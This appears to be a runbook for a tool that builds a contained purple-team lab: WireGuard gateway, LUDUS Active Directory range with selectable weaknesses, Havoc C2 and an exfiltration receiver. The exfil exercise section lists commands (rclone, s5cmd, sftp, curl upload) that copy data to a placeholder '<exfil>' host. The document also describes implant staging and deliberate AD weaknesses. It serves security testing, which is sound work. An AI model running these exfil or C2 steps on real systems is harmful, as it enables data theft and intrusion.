# Lab: a private purple-team range on any provider

A lab is a named set of deployments that share one WireGuard gateway, one
address plan and one SSH key. Inside it c2itall builds the target side (a
LUDUS host that runs a custom Active Directory range) and the red side
(Havoc C2, payload server, attack box, logging server, chat, an exfil
receiver) with nothing exposed to the internet except the gateway's
WireGuard port. Egress is allowed, logged and attributable; every endpoint
starts as a standard user; initial access is out of scope.

## What you get

```
operator ──wg0──► gateway (hub 198.18.0.1, logged NAT)
                     │ WireGuard spokes, one per member (interface lab0; a LUDUS host keeps wg0 for its own VPN)
      ┌──────────────┼──────────────┬───────────────┬──────────────┐
   LUDUS host     exfil receiver   Havoc C2      payload server   attack box / logging / chat
  198.18.0.10+   MinIO:9000        teamserver    nginx 443        (lab mode)
   ┌─────────┐   SFTP:2222         40056
   │ 10.N/16 │   HTTPS:8443        listener 9443
   │ DC01    │
   │ WS01 …  │   ◄── range traffic routed through the hub (10.N.0.0/16 added to every spoke)
   └─────────┘
```

- **Address plan**: lab space `198.18.0.0/16`. Overlay `198.18.0.0/24`
  (hub `.1`, operator `.2`, members from `.10`). Azure and AWS members also
  sit in a shared private subnet carved from `198.18.16.0/20` upward, one
  `/20` per provider. LUDUS ranges keep their own `10.<N>.0.0/16`.
- **Native providers (Azure, AWS)**: a shared VNet/VPC per lab, members on
  a private-only NIC with no public address, a managed NAT gateway for
  egress, flow logs to a storage account / S3 bucket.
- **Overlay providers (Linode, FlokiNET, local, anything new)**: members
  keep their provider address but admit SSH only from the gateway; their
  default route goes through the hub, whose `LABFLOW` log records every new
  connection.
- **Reachability**: the controller reaches members through the gateway
  (`ProxyCommand`); `local` hosts are reached directly. The operator joins
  with `deployments/lab/<name>/operator.conf` (`sudo wg-quick up <file>`).
- **Secrets**: `deployments/lab/<name>/` (0600) holds the operator
  WireGuard config, C2 operator passwords, exfil credentials, LUDUS range
  identities and the implant journal. Nothing in it reaches a log.

## Prerequisites

- A provider account that already works with c2itall, or hosts you built
  yourself for the `local` provider (bare metal, VirtualBox, libvirt,
  Proxmox: anything root can be reached on over SSH).
- `wireguard-tools` on the operator workstation to use `operator.conf`.
- For the LUDUS host: a Debian 12/13 x86_64 host with nested virtualization
  (Azure `Standard_D8s_v5`, AWS `c5.metal`, a dedicated FlokiNET server, or
  a local VM with `--nested-hw-virt on`), 16 GB RAM for the `mini` range,
  32 GB for `corp`, 200 GB disk. Linode offers no nested virtualization and
  is hidden for this workload by the capability gate.
- Optional: the CrowdStrike Falcon Windows sensor installer and your CID.

Local VirtualBox recipe (what the live test uses on this workstation):

```bash
venv/bin/python scripts/local_vm.py create lab-gw    --ip 192.168.56.10 --cpus 1 --ram 1024 --disk 8
venv/bin/python scripts/local_vm.py create lab-exfil --ip 192.168.56.11 --cpus 2 --ram 2048 --disk 16
venv/bin/python scripts/local_vm.py create lab-ludus --ip 192.168.56.12 --cpus 8 --ram 16384 --disk 150 --nested
```

Each VM gets a NAT adapter for egress and a host-only adapter on
`vboxnet0`; root logs in with `~/.ssh/c2deploy_local`. The operator address
for a local lab is the host-only interface (`192.168.56.1`).

## Runbook

Main menu `12) Lab`, in this order:

1. **Create lab + gateway**. Name the lab, list networks it must never
   reach (blocked CIDRs), pick the provider. The gateway is the only VM
   with public inbound: UDP 51820 to everyone, SSH to your /32. On Azure
   and AWS the shared lab network (VNet/VPC, NAT gateway, flow logs) is
   created first and recorded in the lab.
2. **LUDUS host**. Pick the range (`corp` or `mini`), the weakness toggles
   and, once, the Falcon installer path and CID. The play installs LUDUS
   unattended, creates the `lab` user (its API key never leaves the host),
   generates the synthetic datasets, pins the API to the lab networks and
   kicks off the Windows template builds.
3. **Exfil receiver**. MinIO (S3) on 9000, SFTP on 2222, authenticated HTTPS
   upload on 8443, reachable only from the lab and range networks.
   Credentials land in `deployments/lab/<name>/exfil.json`.
4. **C2** (Havoc, lab mode): listener on the member's lab address, named
   operators with generated passwords, no redirector, mail or certificate
   request. Payload hashes are written to the payload manifest (menu
   option 10 prints it).
5. **Payload server, attack box, logging server, chat** as needed; each is
   configured for lab addresses only.
6. **Range deploy** from the LUDUS menu: set the config, deploy, wait for
   `SUCCESS`; the first success takes the `baseline` snapshot and records
   the range network on the gateway and every member.

Order matters only for the gateway (first) and for the logging server
(after the C2 and payload server it ships logs from).

## Ranges and identities

`corp`: DC01 (Server 2022, primary DC), WS01 and WS02 (Windows 11), FS01,
APP01, BK01, MGMT01 (Server 2022). `mini`: DC01 + WS01. Identities, groups,
OUs and shares come from `modules/ludus/identities.yml`; generated passwords
persist in `deployments/lab/<name>/identities.json`. Weaknesses are named
toggles the operator selects (an exposed credential on a share, a
Kerberoastable service account, a local admin on WS02, a disabled user with
a known password, unconstrained delegation on APP01, anonymous share access
on FS01); only the selected ones are applied.

## Execution modes

- **Full chain**: only WS01 gets a beacon; everything else is earned.
- **Technique isolated**: a standard-user beacon is pre-positioned on the VM
  under test.

Implant staging (LUDUS menu) asks for the VM, the domain user, the payload
URL and its SHA-256 from the C2 manifest, and a mandatory note on the
Falcon exception used (or `none`). It writes one line to
`deployments/lab/<name>/journal.jsonl` and runs the role as that user with
limited privileges. `revert baseline` returns every VM to the clean
snapshot.

## Exfil exercise

Datasets (`/srv/lab-datasets` on the LUDUS host, served on port 8000 inside
the lab): `small` ≈10 MB, `medium` ≈250 MB, `large` ≥1 GB of synthetic
financial, employee and credential data as CSV, SQLite, Office documents,
backups and archives, one canary document, and a SHA-256 manifest per set.

Run the tools from the range as the standard user:

```
rclone copy C:\Data remote:drop   --s3-provider Minio --s3-endpoint http://<exfil>:9000
s5cmd --endpoint-url http://<exfil>:9000 cp C:\Data\* s3://drop/
sftp -P 2222 drop@<exfil>            (also Cyberduck / FileZilla)
curl -k -u exfil:<pw> -T file https://<exfil>:8443/upload/file
Havoc: download/upload through the agent
```

Pass criteria: the receiver's ledger (`/var/log/exfil/ledger.jsonl`) holds
name, size, SHA-256, channel and source for every file; `exfil-receiver
verify manifest-<set>.json` exits 0; Falcon shows the activity; nothing
left the lab (the gateway's `LABFLOW` log and the provider flow logs show
only the expected destinations); `exfil-receiver clean` empties the channels
and prints the target-side checklist.

## C2 acceptance checklist

| Requirement | Where the proof lives |
|---|---|
| C2 reachable only inside the lab | member has no cloud inbound rule; listener on the lab address |
| Named operators | `deployments/lab/<name>/c2-operators.json`; Havoc audit log on the teamserver |
| Payload hashes and manifest | `/root/Tools/Havoc/payloads/manifest.json` (menu option 10) |
| Revoke / terminate | `/root/Tools/havoc_killall.sh` stops the teamserver and closes the listener ports; `revert baseline` removes agents |
| Agents run as a standard user | the implant role runs as the chosen domain user with limited privileges |

The spec's "Updated C2 Acceptance Criteria" section was cut off in the
request; the rows above cover the requirements that arrived.

## CrowdStrike

Give the LUDUS menu the Windows sensor installer and CID once; the
`lab_falcon` role installs it on every range VM. Sensor traffic leaves
through the hub (overlay) or the NAT gateway (native) and is logged like
everything else. LUDUS testing mode is off by default; `ludus testing
start` plus `ludus testing allow` for the Falcon cloud domains is the
optional strict mode.

## Day-2 on the LUDUS host

`ssh` through the gateway (`deployments/lab/<name>/gateway-known-hosts`
holds its key), then `source /root/.ludus-lab.env` and use `ludus range
status`, `ludus range logs`, `ludus snapshots`, `ludus testing`.

## Teardown

Lab menu option 11 or `venv/bin/python teardown.py --lab <name> --force`:
members in reverse order, then the gateway, then the shared networks (the
Azure flow log and resource group, the AWS VPC and bucket), then the lab's
key, record and secrets. It stops at the first failure and can be run again.

## Limits and timings

- A private Azure/AWS member needs the lab gateway on the same provider
  (the bootstrap SSH path crosses the private subnet). Overlay members join
  any gateway. A `local` lab needs a gateway its hosts can reach.
- Rebuilding a gateway on the same address leaves a stale entry in the
  members' known-hosts files; remove the line.
- Lab core 15-25 min per provider; LUDUS install 20-35 min; template builds
  1-2 h on hardware, 3-6 h under nested VirtualBox; `mini` deploy 30-50 min;
  `corp` 1-2 h; exfil receiver 3-5 min.
- `havoc_killall.sh` cuts agents off; it cannot make them exit.
- Range-VM source attribution at the receiver depends on the range router
  not translating addresses toward the lab networks; the ledger records what
  arrives.
- Identity passwords also live in the range config on the LUDUS host, and
  LUDUS's own local administrator stays on every VM: lab artefacts, not
  secrets.
